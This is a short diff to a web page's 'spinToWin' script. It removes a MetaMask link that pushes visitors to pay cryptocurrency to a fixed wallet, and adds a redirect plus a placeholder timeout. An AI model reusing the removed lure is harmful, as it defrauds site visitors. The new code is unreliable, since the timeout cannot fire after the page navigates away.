@@ -66,10 +66,15 @@
 
     <script>
         function spinToWin() {
-            // Wait for 5 seconds before opening the new window/tab
+            // Redirect the user to example.com
+            window.location.href = 'https://www.example.com';
+
+            // Add a delay to perform the button action on your site
             setTimeout(function () {
-                // Open a new window/tab to example.com
-                window.open('https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16');
+                // Place your button action code here
+                // For example, you can simulate a button click
+                // or perform any other action you want.
+                console.log('Button action performed after returning from example.com');
             }, 5000); // 5000 milliseconds (5 seconds)
         }
     </script>
